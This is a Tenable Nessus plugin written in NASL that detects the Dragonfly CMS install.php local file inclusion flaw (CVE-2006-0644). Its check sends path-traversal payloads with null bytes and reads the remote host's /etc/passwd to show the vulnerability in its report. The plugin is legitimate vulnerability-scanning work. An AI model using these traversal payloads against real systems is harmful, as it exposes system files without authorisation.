#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20869);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-0644");
  script_bugtraq_id(16546);
  script_xref(name:"OSVDB", value:"23058");

  script_name(english:"Dragonfly CMS install.php newlang Variable Local File Inclusion");
  script_summary(english:"Checks for currentlang parameter local file include vulnerability in Dragonfly CMS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Dragonfly / CPG-Nuke CMS, a
content management system written in PHP. 

The installed version of Dragonfly / CPG-Nuke CMS fails to validate
user input to the 'getlang' parameter as well as the 'installlang'
cookie before using them in the 'install.php' script in PHP
'require()' functions.  An unauthenticated attacker can leverage this
issue to view arbitrary files on the remote host and possibly to
execute arbitrary PHP code taken from files on the remote host, both
subject to the privileges of the web server user id.  

Note that successful exploitation is not affected by PHP's
'register_globals' and 'magic_quotes_gpc' settings." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/dragonfly9.0.6.1_incl_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/424439/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://dragonflycms.org/Forums/viewtopic/p=98034.html" );
 script_set_attribute(attribute:"solution", value:
"Remove the affected 'install.php' script." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# A function to actually read a file.
function exploit(dir, file) {
  local_var r;
  global_var port;

  r = http_send_recv3(method: 'GET', port: port, item: string(dir, "/install.php?", "newlang=", file) );
  if (isnull(r)) exit(0);
  return r[2];
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/public_html", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = exploit(dir:dir, file:"../../cpg_error.log%00");

  # There's a problem if it looks like Dragonfly's log file.
  if ("# CHMOD this file to" >< res) {
    # Try to exploit it to read /etc/passwd for the report.
    res2 = exploit(dir:dir, file:"../../../../../../../../../../etc/passwd%00");
    if (res2) contents = res2 - strstr(res2, "<!DOCTYPE html PUBLIC");

    if (isnull(contents)) security_hole(port);
    else {
      report = string(
        "\n",
        "Here is the /etc/passwd file that Nessus read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }

    exit(0);
  }
}
